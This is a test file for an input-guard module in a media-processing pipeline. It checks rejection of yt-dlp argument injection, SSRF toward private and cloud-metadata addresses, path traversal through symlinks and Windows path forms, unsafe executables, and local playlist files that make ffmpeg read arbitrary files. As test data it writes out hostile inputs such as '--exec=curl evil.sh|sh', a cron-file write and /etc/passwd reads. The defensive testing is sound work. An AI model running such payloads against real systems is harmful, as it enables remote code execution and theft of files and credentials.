/**
 * Attack-case tests for D-01 §8.4 / §8.5.
 *
 * Every defence layer gets at least one test that would FAIL if the layer were removed.
 * A layer with no such test is a comment, not a control.
 *
 * Run: node --test packages/pipeline/dist/subprocess/__tests__/argGuard.test.js
 */

import assert from 'node:assert/strict';
import { mkdtemp, mkdir, readFile, realpath, symlink, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { after, describe, it } from 'node:test';

import { UPLOAD_MEDIA_EXTENSIONS } from '@openmemo/shared';

import {
  MAX_URL_BYTES,
  MEDIA_EXTENSIONS,
  PLAYLIST_EXTENSIONS,
  assertWithinRoot,
  buildArgv,
  isPrivateOrReservedHost,
  hasAllowedMediaExtension,
  isLocalImportSafeExtension,
  isPlaylistExtension,
  isSafeExecutable,
  safePrompt,
  validateHttpUrl,
} from '../argGuard.js';

/** Assert rejection AND that it was rejected for the expected reason. */
function assertRejected(
  result: { ok: true; value: unknown } | { ok: false; code: string; message: string },
  expectedCode: string,
  label: string,
): void {
  assert.equal(result.ok, false, `${label}: expected rejection but it was ACCEPTED`);
  if (!result.ok) {
    // Asserting the CODE, not just the rejection: a check that rejects for the wrong
    // reason is a check that is not actually protecting what we think it protects.
    assert.equal(result.code, expectedCode, `${label}: rejected, but for the wrong reason`);
  }
}

describe('L3 — argument injection (the attack shell:false does NOT stop)', () => {
  it('rejects the canonical yt-dlp arbitrary-execution payload', () => {
    // The headline case from D-01 §8.4: with shell:false this is not shell injection,
    // it is a perfectly ordinary argv element that yt-dlp parses as an OPTION.
    assertRejected(
      validateHttpUrl('--exec=curl evil.sh|sh'),
      'leading_dash',
      '--exec payload',
    );
  });

  it('rejects every option-shaped input', () => {
    for (const payload of [
      '-o/etc/cron.d/pwn',
      '--config-locations=/tmp/evil.conf',
      '--load-info-json=/tmp/x.json',
      '--batch-file=/etc/passwd',
      '-',
      '--',
      '--paths=/root',
    ]) {
      assertRejected(validateHttpUrl(payload), 'leading_dash', payload);
    }
  });

  it('rejects non-http schemes (file/ftp/data/javascript)', () => {
    assertRejected(validateHttpUrl('file:///etc/passwd'), 'bad_scheme', 'file:');
    assertRejected(validateHttpUrl('ftp://example.com/x.mp3'), 'bad_scheme', 'ftp:');
    assertRejected(validateHttpUrl('data:audio/wav;base64,AAAA'), 'bad_scheme', 'data:');
    assertRejected(validateHttpUrl('javascript:alert(1)'), 'bad_scheme', 'javascript:');
  });

  it('rejects embedded credentials', () => {
    assertRejected(
      validateHttpUrl('https://user:pass@example.com/a.mp3'),
      'embedded_credentials',
      'credentials',
    );
  });

  it('rejects control characters BEFORE parsing (URL() would launder them)', () => {
    // new URL() silently strips \n and \t. Checking after parsing would let a hostile
    // string through in a clean-looking form.
    assertRejected(
      validateHttpUrl('https://example.com/a.mp3\n--exec=sh'),
      'control_characters',
      'newline smuggling',
    );
    assertRejected(validateHttpUrl('https://example.com/\u0000'), 'control_characters', 'NUL');
    assertRejected(validateHttpUrl('https://exa\tmple.com/a'), 'control_characters', 'tab');
  });

  it('enforces the length cap in BYTES, not characters', () => {
    // 1000 four-byte emoji = 4000 bytes but only 1000 code units.
    const emojiUrl = `https://example.com/${'\u{1F600}'.repeat(1000)}`;
    assert.ok(emojiUrl.length < MAX_URL_BYTES, 'precondition: short in UTF-16 units');
    assertRejected(validateHttpUrl(emojiUrl), 'too_long', 'multibyte length bypass');
  });

  it('accepts a legitimate URL and returns the NORMALISED form', () => {
    const r = validateHttpUrl('https://Example.COM/path/a%20b.mp3?x=1');
    assert.equal(r.ok, true);
    if (r.ok) {
      // Validating one string and passing a different one is a classic bypass, so the
      // guard hands back exactly what it checked.
      assert.equal(r.value.href, 'https://example.com/path/a%20b.mp3?x=1');
      assert.equal(r.value.hostname, 'example.com');
    }
  });
});

describe('L3.3 — SSRF (our own daemon listens on 127.0.0.1)', () => {
  it('blocks loopback, private, link-local and metadata addresses', () => {
    for (const host of [
      '127.0.0.1', '127.1.2.3', '0.0.0.0', 'localhost',
      '10.0.0.1', '172.16.0.1', '172.31.255.254', '192.168.1.1',
      '169.254.169.254', // AWS/GCE metadata
      '100.64.0.1', // CGNAT
      '::1', 'fe80::1', 'fc00::1', 'fd12::34',
      '::ffff:127.0.0.1', // IPv4-mapped loopback
      'foo.local', 'db.internal',
    ]) {
      assert.equal(isPrivateOrReservedHost(host), true, `${host} should be blocked`);
    }
  });

  it('allows ordinary public addresses', () => {
    for (const host of ['example.com', '8.8.8.8', '1.1.1.1', '93.184.216.34', '2606:4700::1111']) {
      assert.equal(isPrivateOrReservedHost(host), false, `${host} should be allowed`);
    }
  });

  it('rejects a URL pointing at the metadata endpoint', () => {
    assertRejected(
      validateHttpUrl('http://169.254.169.254/latest/meta-data/iam/security-credentials/'),
      'private_address',
      'cloud metadata SSRF',
    );
  });

  it('rejects a URL pointing at our own daemon port', () => {
    assertRejected(
      validateHttpUrl('http://127.0.0.1:7331/api/v1/settings'),
      'private_address',
      'confused-deputy against our own API',
    );
  });
});

describe('L6 — the argv invariant', () => {
  it('places user operands after "--" and never merges them into a flag', () => {
    const r = buildArgv({ flags: ['--ignore-config', '-o', '%(id)s.%(ext)s'], operands: ['https://example.com/a.mp3'] });
    assert.equal(r.ok, true);
    if (r.ok) {
      assert.deepEqual(r.value, [
        '--ignore-config', '-o', '%(id)s.%(ext)s',
        '--',
        'https://example.com/a.mp3',
      ]);
      // The operand is exactly one element — never concatenated into its neighbour.
      assert.equal(r.value.filter((a) => a.includes('example.com')).length, 1);
    }
  });

  it('still rejects a dash-leading operand even though "--" is present', () => {
    // Defence in depth: yt-dlp honours `--`, but we do not rely on every future tool
    // doing so.
    assertRejected(buildArgv({ flags: [], operands: ['--exec=sh'] }), 'leading_dash', 'dash after --');
  });

  it('rejects operands carrying control characters', () => {
    assertRejected(
      buildArgv({ flags: [], operands: ['https://x.com/a\nb'] }),
      'control_characters',
      'newline in operand',
    );
  });

  it('omits "--" when there are no operands', () => {
    const r = buildArgv({ flags: ['-version'], operands: [] });
    assert.equal(r.ok, true);
    if (r.ok) assert.deepEqual(r.value, ['-version']);
  });
});

describe('L4 — prompt truncation', () => {
  it('caps the prompt so it cannot blow past MAX_ARG_STRLEN', () => {
    const out = safePrompt('x'.repeat(100_000));
    assert.notEqual(out, null);
    assert.equal(out!.length, 1024);
  });

  it('strips control characters from the prompt', () => {
    assert.equal(safePrompt('hello\nworld'), 'hello world');
  });

  it('maps an empty prompt to null rather than an empty argv element', () => {
    assert.equal(safePrompt('   '), null);
    assert.equal(safePrompt(undefined), null);
  });
});

describe('L2 — executable allowlist (CVE-2024-27980)', () => {
  it('refuses .bat/.cmd on Windows, which Node can only run via cmd.exe', () => {
    for (const p of ['C:\\tools\\yt-dlp.bat', 'C:\\tools\\x.cmd', 'C:\\tools\\x.ps1']) {
      assertRejected(isSafeExecutable(p, 'win32'), 'unsafe_executable', p);
    }
  });

  it('allows .exe on Windows', () => {
    assert.equal(isSafeExecutable('C:\\tools\\yt-dlp.exe', 'win32').ok, true);
  });

  it('requires an absolute path so PATH is never searched', () => {
    assertRejected(isSafeExecutable('ffmpeg', 'linux'), 'path_escape', 'bare command name');
  });
});

describe('L7 (§8.5) — path traversal', () => {
  const dirs: string[] = [];
  after(() => {
    // Scratch dirs live under the OS temp dir; leaving them is harmless.
    dirs.length = 0;
  });

  it('blocks ../ escapes and allows legitimate children', async () => {
    const root = await mkdtemp(join(tmpdir(), 'openmemo-guard-'));
    dirs.push(root);
    await mkdir(join(root, 'media'), { recursive: true });
    await writeFile(join(root, 'media', 'ok.wav'), 'x');

    assertRejected(
      await assertWithinRoot(root, '../../../etc/passwd'),
      'path_escape',
      'dot-dot escape',
    );
    assertRejected(await assertWithinRoot(root, '/etc/passwd'), 'path_escape', 'absolute escape');

    const good = await assertWithinRoot(root, 'media/ok.wav');
    assert.equal(good.ok, true, 'legitimate child path should be accepted');
  });

  it('follows symlinks before deciding — a lexical check would be fooled', async () => {
    const root = await mkdtemp(join(tmpdir(), 'openmemo-guard-'));
    dirs.push(root);
    /*
     * ★ T-147: this used to symlink to the host's `/etc`, with the failure swallowed by
     * `.catch(() => undefined)`. Two problems, both of the "asserts nothing" kind:
     *   · `/etc` does not exist on Windows, so the link was never created there and the
     *     candidate resolved happily INSIDE the root — the test then failed for a reason
     *     that has nothing to do with the guard.
     *   · the swallowed error meant the precondition was never checked anywhere.
     * So: build the outside target ourselves (works on every platform), and assert the
     * precondition — the link really does lead out of the root and really is readable —
     * before asserting that the guard rejects it. Otherwise this case can pin zero.
     */
    const outside = await mkdtemp(join(tmpdir(), 'openmemo-guard-OUTSIDE-'));
    dirs.push(outside);
    await writeFile(join(outside, 'passwd'), 'SECRET-OUTSIDE-ROOT');
    await symlink(outside, join(root, 'escape'));
    assert.equal(
      await readFile(join(root, 'escape', 'passwd'), 'utf8'),
      'SECRET-OUTSIDE-ROOT',
      'precondition: the link must really reach outside the root',
    );

    const r = await assertWithinRoot(root, 'escape/passwd');
    // If this ever starts passing, someone replaced realpath with path.resolve.
    assertRejected(r, 'path_escape', 'symlink escape');
  });

  /*
   * ★ T-143 ② — the Windows half of this guard, executed on Linux for the first time.
   *
   * Until now `assertWithinRoot` read the host's `process.platform`, so on this machine
   * the UNC / drive-relative branch was UNREACHABLE and no test had ever run it. That is
   * bug #8 of the false-green family (`isSafeExecutable`) sitting untouched in the
   * function next door — same shape, same fix: platform becomes an input.
   *
   * These cases pass the platform EXPLICITLY, so they pin the guard's behaviour on
   * Windows regardless of where the suite happens to run.
   */
  describe('T-143 ② — win32 path forms (previously unreachable on Linux)', () => {
    const WIN_ROOT = 'C:\\openmemo\\data';

    it('★ UNC path is rejected under win32 rules', async () => {
      assertRejected(
        await assertWithinRoot(WIN_ROOT, '\\\\server\\share\\evil', 'win32'),
        'path_escape',
        'UNC',
      );
    });

    it('★ drive-relative path is rejected under win32 rules', async () => {
      assertRejected(await assertWithinRoot(WIN_ROOT, 'C:evil', 'win32'), 'path_escape', 'C:rel');
      assertRejected(await assertWithinRoot(WIN_ROOT, 'd:evil', 'win32'), 'path_escape', 'd:rel');
    });

    it('★ absolute drive path outside the root is rejected under win32 rules', async () => {
      assertRejected(
        await assertWithinRoot(WIN_ROOT, 'C:\\Windows\\win.ini', 'win32'),
        'path_escape',
        'other absolute drive path',
      );
    });

    it('★ backslash traversal is rejected under win32 rules (posix rules would miss it)', async () => {
      assertRejected(
        await assertWithinRoot(WIN_ROOT, '..\\..\\Windows\\win.ini', 'win32'),
        'path_escape',
        'backslash dot-dot',
      );
    });

    it('★ a legitimate win32 child is still accepted (the guard must not reject everything)', async () => {
      const r = await assertWithinRoot(WIN_ROOT, 'media\\ok.wav', 'win32');
      assert.equal(r.ok, true, 'a normal Windows subpath must pass');
      assert.equal(r.ok === true ? r.value : '', 'C:\\openmemo\\data\\media\\ok.wav');
    });

    /*
     * The half that documents WHY this needed a parameter at all: run the exact same
     * inputs under posix rules and the UNC form is NOT rejected — it becomes a file
     * whose name contains backslashes, sitting inside the root.
     *
     * That is the honest scope of the bug: harmless on Linux, but it means the Windows
     * branch had never been executed by anything, ever.
     */
    it('★ under posix rules the same UNC string is merely a weird filename — this is why the branch was invisible', async () => {
      const root = await mkdtemp(join(tmpdir(), 'openmemo-guard-'));
      dirs.push(root);
      const r = await assertWithinRoot(root, '\\\\server\\share\\evil', 'linux');
      assert.equal(r.ok, true, 'posix treats backslashes as ordinary filename characters');
      const value = r.ok === true ? r.value : '';
      /*
       * ★ T-145: compare against realpath(root), not root — macOS's TMPDIR is under
       *   `/var` → `/private/var`, and `assertWithinRoot` returns realpath'd values.
       * ★ T-147: and then don't compare a full string at all.
       *
       *   The call FORCES posix rules while `realpath` is unavoidably host-bound, so on
       *   a Windows host the impl runs `posix.resolve()` over a `C:\…` string and the
       *   result is neither a valid win32 path nor a valid posix one. Rebuilding that
       *   with the host's `join()` gave `C:\…\server\share\evil` (win32 `join`
       *   NORMALISES the backslashes away) — `[CI 实测]` ci-crossplatform run
       *   31037387863, win32/x64.
       *
       *   What this case actually claims is a STRUCTURE, not a string: the UNC form is
       *   not rejected, and it lands inside the root as a filename that still contains
       *   the backslashes. So assert exactly that — plus one reverse case, because
       *   "ok + ends with the candidate" would also be satisfied by a guard that let
       *   everything through.
       */
      assert.equal(
        value.endsWith('\\\\server\\share\\evil'),
        true,
        'the backslashes survive verbatim — it is just a weird filename',
      );
      assert.equal(
        value.length > '\\\\server\\share\\evil'.length,
        true,
        'the root is still prefixed onto it — it stays INSIDE the root, not an escape',
      );
      assertRejected(
        await assertWithinRoot(root, '../escape', 'linux'),
        'path_escape',
        'same posix rules still reject a real escape (otherwise the two lines above pin zero)',
      );
    });
  });

  /*
   * ★★ T-145 — the managed root itself sits behind a symlink.
   *
   * Found by CI: `packages/pipeline` was the only red on macos-26, and chasing it
   * turned up a REAL product bug, not just a host-bound test.
   *
   * The symptom is unusually nasty because it is HALF working:
   *   - a file that already exists  -> accepted
   *   - a file about to be CREATED  -> rejected as path_escape
   * i.e. reading works and writing does not, which reads like a permissions problem.
   *
   * Mechanism: `realpathOrResolve` falls back to the lexical path when the target does
   * not exist yet (correct — you cannot realpath a file that is not there). So when the
   * root is behind a symlink, the two sides of the comparison came from different
   * branches: the root was realpath'd, the not-yet-existing target was not.
   *
   * Why macOS and not Linux: on macOS `/var` and `/tmp` ARE symlinks (-> /private/…),
   * so the DEFAULT temp dir already triggers it. On Linux you have to build the symlink
   * yourself — which is exactly what these cases do, so they pin the behaviour
   * everywhere and would have caught it on this box.
   */
  describe('T-145 — managed root reached through a symlink (macOS default TMPDIR is)', () => {
    async function symlinkedRoot(): Promise<{ link: string; real: string }> {
      const base = await mkdtemp(join(tmpdir(), 'openmemo-symroot-'));
      dirs.push(base);
      const real = join(base, 'realroot');
      await mkdir(real);
      const link = join(base, 'linkroot');
      await symlink(real, link);
      return { link, real: await realpath(real) };
    }

    it('★ a file that does not exist yet is still INSIDE the root (this is the bug)', async () => {
      const { link, real } = await symlinkedRoot();
      const r = await assertWithinRoot(link, 'newfile.wav');
      assert.equal(r.ok, true, 'an output path the pipeline is about to create must pass');
      assert.equal(r.ok === true ? r.value : '', join(real, 'newfile.wav'));
    });

    it('★ nested not-yet-existing path too', async () => {
      const { link, real } = await symlinkedRoot();
      const r = await assertWithinRoot(link, 'sub/new.wav');
      assert.equal(r.ok, true);
      assert.equal(r.ok === true ? r.value : '', join(real, 'sub', 'new.wav'));
    });

    it('an existing file keeps working (it always did — that is why this hid)', async () => {
      const { link, real } = await symlinkedRoot();
      await writeFile(join(real, 'exists.wav'), 'x');
      const r = await assertWithinRoot(link, 'exists.wav');
      assert.equal(r.ok, true);
      assert.equal(r.ok === true ? r.value : '', join(real, 'exists.wav'));
    });

    /* ★ The reverse half: the fix must NOT have loosened any of the three escapes. */
    it('★ `..` traversal is still rejected through a symlinked root', async () => {
      const { link } = await symlinkedRoot();
      assertRejected(await assertWithinRoot(link, '../escape'), 'path_escape', 'dot-dot');
    });

    it('★ an absolute path is still rejected through a symlinked root', async () => {
      const { link } = await symlinkedRoot();
      assertRejected(await assertWithinRoot(link, '/etc/hostname'), 'path_escape', 'absolute');
    });

    it('★ a symlink INSIDE the root pointing outside is still rejected', async () => {
      const { link, real } = await symlinkedRoot();
      /*
       * ★ T-147: this used to point at `/etc/hostname`. That file exists on Linux and
       * NOT on macOS — `[CI 实测]` ci-crossplatform run 31037387863, darwin-arm64 was
       * red on exactly this line, and win32 too. A dangling link makes
       * `realpathOrResolve` fall back to the lexical path, which lands back inside the
       * root, so the guard correctly does not reject it — i.e. the test was pinning
       * "the host is Debian-shaped", not "the guard follows symlinks".
       */
      const outside = await mkdtemp(join(tmpdir(), 'openmemo-guard-OUTSIDE-'));
      dirs.push(outside);
      const secret = join(outside, 'secret.wav');
      await writeFile(secret, 'OUTSIDE');
      await symlink(secret, join(real, 'escape.wav'));
      // precondition: the link must really be readable and really lead outside
      assert.equal(await readFile(join(real, 'escape.wav'), 'utf8'), 'OUTSIDE');

      assertRejected(await assertWithinRoot(link, 'escape.wav'), 'path_escape', 'inner symlink');
    });
  });
});

describe('L4 — playlist indirection (measured attack, T-026)', () => {
  it('refuses playlist extensions for LOCAL import', () => {
    /*
     * A local .m3u8 whose segment URI is `file:///tmp/secret.ts` makes ffmpeg open that
     * path — verified in a real run:
     *     Opening 'file:///tmp/attack/secret.ts' for reading
     * The local branch must pass `-protocol_whitelist file` for ordinary media to
     * decode, so the protocol whitelist cannot stop this. Refusing local playlist
     * imports is what closes it.
     */
    for (const p of ['/tmp/evil.m3u8', '/tmp/evil.m3u', '/tmp/x.pls', '/tmp/x.xspf', '/tmp/x.asx']) {
      assert.equal(isPlaylistExtension(p), true, `${p} must be recognised as a playlist`);
      assert.equal(isLocalImportSafeExtension(p), false, `${p} must not be locally importable`);
    }
  });

  it('still allows ordinary media for local import', () => {
    for (const p of ['/tmp/a.mp3', '/tmp/a.wav', '/tmp/a.mp4', '/tmp/a.flac']) {
      assert.equal(isLocalImportSafeExtension(p), true, `${p} should remain importable`);
    }
  });

  it('keeps .m3u8 in the general media allowlist (remote HLS must still work)', () => {
    // Remote HLS uses a protocol whitelist WITHOUT `file`, which was verified to block
    // the same attack. Only LOCAL import is refused.
    assert.equal(hasAllowedMediaExtension('/x/stream.m3u8'), true);
  });

  it('★ 本地导入必须拒掉 .m3u8（T-026 那条实测攻击的最小钉子）', () => {
    assert.equal(isLocalImportSafeExtension('x.m3u8'), false, '.m3u8 不许本地导入');
  });
});

// ---------------------------------------------------------------------------
// ★ T-152 —— 扩展名白名单的**拒绝侧**
// ---------------------------------------------------------------------------

/**
 * ★★ 这一组补的是"拒绝"，不是"接受"。
 *
 * `[变异实测]`（收敛之前，`debt-cleanup` T-152 §2.3）：把 `hasAllowedMediaExtension`
 * 的函数体改成 `return true;` —— 也就是 `evil.exe` / `payload.sh` **全部放行** ——
 * `packages/pipeline` **187 条测试全绿**。把同一行换成 `throw` 则当场红 6 条。
 *
 * 两个结果合起来说明一件事：这个函数**确实被执行到**（行覆盖很好看），
 * 但**没有任何一条测试依赖过它拒绝什么**。行覆盖测的是"跑没跑到"，
 * 不是"判据对不对" —— 一个只有接受侧断言的白名单，等于没有白名单。
 *
 * 所以下面每一条钉的都是**后果**（"这个名字必须进不来"），不是关键词。
 */
describe('★ 媒体扩展名白名单 —— 拒绝侧（T-152：收敛前这一层行覆盖好看、断言全无）', () => {
  /**
   * 已知的非媒体扩展名样本。混了三类：
   *  · 可执行 / 脚本（白名单存在的首要理由）
   *  · 原生库与安装包
   *  · 形态畸形的名字：无扩展名、只有前导点、双扩展名、点结尾
   */
  const NON_MEDIA_NAMES = [
    'evil.exe',
    'payload.sh',
    'x.dll',
    'a.bat',
    'a.cmd',
    'a.com',
    'a.scr',
    'a.ps1',
    'a.vbs',
    'x.so',
    'x.dylib',
    'a.py',
    'a.rb',
    'a.jar',
    'a.msi',
    'a.deb',
    'a.apk',
    'a.zip',
    'a.pdf',
    'a.txt',
    'a.json',
    'a.iso',
    'a.desktop',
    'a.lnk',
    'no-extension',
    '.hidden',
    'x.m3u8.exe', // 双扩展名：判据取**最后**一个点之后，骗不过它
    'evil.exe.', // 点结尾 → 扩展名是 '.'
  ];

  it('★ 一批已知的非媒体扩展名必须**全部**被拒（这条就是那个恒真变异的钉子）', () => {
    /*
     * 守卫只挡"样本集被筛空了 → 下面那条永远绿"（⑤A-2）。
     * ⚠️ 守卫**只能加在样本集（输入）上，绝不能加在 accepted（要报告的量）上**：
     *    给要报告的量加非空守卫，真出问题时先炸的是守卫，而守卫不告诉你为什么。
     *    本项目已经因此犯错两次。
     */
    assert.equal(
      NON_MEDIA_NAMES.length >= 25,
      true,
      `样本集只剩 ${NON_MEDIA_NAMES.length} 个，样本被筛空了 —— 这条断言此刻钉的是零`,
    );

    const accepted = NON_MEDIA_NAMES.filter((n) => hasAllowedMediaExtension(n));
    assert.deepEqual(
      accepted,
      [],
      '这些名字被媒体白名单**放行**了。若 accepted 是完整样本集，说明 ' +
        'hasAllowedMediaExtension 退化成了恒真（历史上这个变异让 187 条测试全绿）：\n  ' +
        accepted.join('\n  '),
    );
  });

  it('★ 函数有判别力：既不是恒真也不是恒假', () => {
    // 恒假同样是一种坏法（把所有媒体都挡在外面，产品直接不可用），
    // 而只写"拒绝"断言的话恒假是绿的。两侧都钉才关得住。
    const mustAccept = ['a.mp3', 'a.mp4', 'a.wav', 'a.flv', 'a.wmv', 'a.ts', 'a.mpeg', 'a.mpg'];
    const mustReject = ['evil.exe', 'payload.sh', 'x.dll', 'a.bat'];

    assert.deepEqual(
      mustAccept.filter((n) => !hasAllowedMediaExtension(n)),
      [],
      '这些是货真价实的媒体，被拒了 —— 白名单退化成恒假',
    );
    assert.deepEqual(
      mustReject.filter((n) => hasAllowedMediaExtension(n)),
      [],
      '这些是可执行文件，被放行了 —— 白名单退化成恒真',
    );
  });

  it('★ 播放列表扩展名一个都不许出现在 UPLOAD_MEDIA_EXTENSIONS 里（安全边界）', () => {
    // T-026：本地 .m3u8 的 segment URI 写 file:///… 就能让 ffmpeg 读任意本地文件。
    // 一旦它进了上传白名单，用户就能直接把这个原语传到服务器上。
    assert.equal(
      PLAYLIST_EXTENSIONS.size >= 6,
      true,
      `播放列表集合只剩 ${PLAYLIST_EXTENSIONS.size} 项，被筛空了`,
    );
    const leaked = [...PLAYLIST_EXTENSIONS].filter((e) => UPLOAD_MEDIA_EXTENSIONS.has(e));
    assert.deepEqual(
      leaked,
      [],
      '播放列表扩展名漏进了上传白名单 —— 这不是口味问题，是把间接寻址原语开放给了上传：\n  ' +
        leaked.join('\n  '),
    );
  });

  it('★ 由构造相等：上传端点收得下的，pipeline 必须全都认（收敛前 {mpeg,mpg} 那个洞）', () => {
    assert.equal(
      UPLOAD_MEDIA_EXTENSIONS.size >= 19,
      true,
      `上传白名单只剩 ${UPLOAD_MEDIA_EXTENSIONS.size} 项，被筛空了`,
    );
    const missing = [...UPLOAD_MEDIA_EXTENSIONS].filter((e) => !MEDIA_EXTENSIONS.has(e));
    assert.deepEqual(
      missing,
      [],
      '这些扩展名上传端点收得下、pipeline 的媒体白名单却不认 —— ' +
        '就是收敛前 `daemon ∖ pipeline = {mpeg, mpg}` 那个洞。' +
        'MEDIA_EXTENSIONS 必须由并集构造，不能手抄：\n  ' +
        missing.join('\n  '),
    );
  });

  it('★ T-153：pipeline 的集合相对收敛前恰好只多了 {mpeg,mpg} —— 收敛不许顺手把口子开大', () => {
    /*
     * `debt-cleanup` T-152 §2.3 实测记录下来的**收敛前**那 24 项（HEAD `fca18f6`）。
     * 这是本条断言的锚点：收敛的目标是"三份变一份"，不是"趁机放宽"。
     *
     * ⚠️ 第一版并集写成了 `∪ PLAYLIST_EXTENSIONS`，于是 `.m3u/.pls/.xspf/.asx/.wpl`
     * 五个也进了 pipeline 的媒体白名单 —— 后果不是多五个字符串，是
     * `directHttp.match()` 对它们的评分 30→80、`probe()` 的 `looksMedia` 直接成立，
     * **产品会去抓的远程 URL 范围变大了**，而那是一次没人要求过的行为变更。
     */
    const BEFORE_T152 = [
      '.aac', '.aif', '.aiff', '.ass', '.avi', '.flac', '.flv', '.m3u8', '.m4a', '.m4v',
      '.mkv', '.mov', '.mp3', '.mp4', '.oga', '.ogg', '.opus', '.srt', '.ts', '.vtt',
      '.wav', '.webm', '.wma', '.wmv',
    ];
    assert.equal(BEFORE_T152.length, 24, '锚点自己被改坏了');
    const now = [...MEDIA_EXTENSIONS].sort();
    const added = now.filter((e) => !BEFORE_T152.includes(e));
    const removed = BEFORE_T152.filter((e) => !MEDIA_EXTENSIONS.has(e));
    assert.deepEqual(added, ['.mpeg', '.mpg'], `多出来的不止 {mpeg,mpg}：${added.join(' ')}`);
    assert.deepEqual(removed, [], `丢了：${removed.join(' ')}`);
  });

  it('收敛决策的具体取值（改动它们要连注释一起改）', () => {
    // web 早就放行、daemon 漏了的两个
    assert.equal(UPLOAD_MEDIA_EXTENSIONS.has('.flv'), true, 'flv：web 早就放行，daemon 漏了');
    assert.equal(UPLOAD_MEDIA_EXTENSIONS.has('.wmv'), true, 'wmv：web 早就放行，daemon 漏了');
    // daemon 早就收、web 漏了的那个。⚠️ 与 TypeScript 源文件同扩展名：
    // 拖一个 .ts 源码进来会过扩展名预检，由服务端 ffprobe 当场认出不是媒体并拒掉（D-01 §8.5）。
    assert.equal(UPLOAD_MEDIA_EXTENSIONS.has('.ts'), true, 'ts：daemon 早就收，web 漏了');
    // 字幕/播放列表只在 pipeline 超集里，不在上传白名单里
    assert.equal(UPLOAD_MEDIA_EXTENSIONS.has('.srt'), false, '字幕不走上传端点');
    assert.equal(MEDIA_EXTENSIONS.has('.srt'), true, '但 pipeline 认字幕');
    assert.equal(UPLOAD_MEDIA_EXTENSIONS.has('.m3u8'), false, '★ 播放列表绝不许上传');
    assert.equal(MEDIA_EXTENSIONS.has('.m3u8'), true, '但远程 HLS 必须还能用');
  });
});
